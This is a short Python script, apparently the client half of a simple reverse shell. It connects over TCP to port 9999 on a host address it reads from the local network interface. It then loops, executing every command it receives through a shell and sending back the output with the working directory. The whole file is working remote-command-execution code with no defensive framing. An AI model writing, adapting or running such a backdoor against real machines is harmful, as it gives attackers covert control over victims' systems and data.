import os
import socket
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # socket.SOCK_STREAM is for TCP connection.
host = os.popen('ipconfig getifaddr en0').readlines()[0].rstrip('\n')  # Get the IP address of the client machine.
port = 9999
s.connect((host, port))
while True:
    data = s.recv(1024)  # Receive the data from the server with a buffer size of 1024 bytes
    print("SERVER'S COMMAND: {}".format(data))
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    if data.decode('utf-8') == 'quit':
        print("SHUTTING DOWN CLIENT'S SIDE.")
        s.close()
        exit()
    if len(data) > 0:
        cmd = subprocess.Popen(data.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        s.send(str.encode(os.getcwd() + "$ " + output_str))
        # print("Output: {}".format(output_str))
    if data == 'quit':
        print("SHUTTING DOWN CLIENT'S SIDE.")
        s.close()
        exit()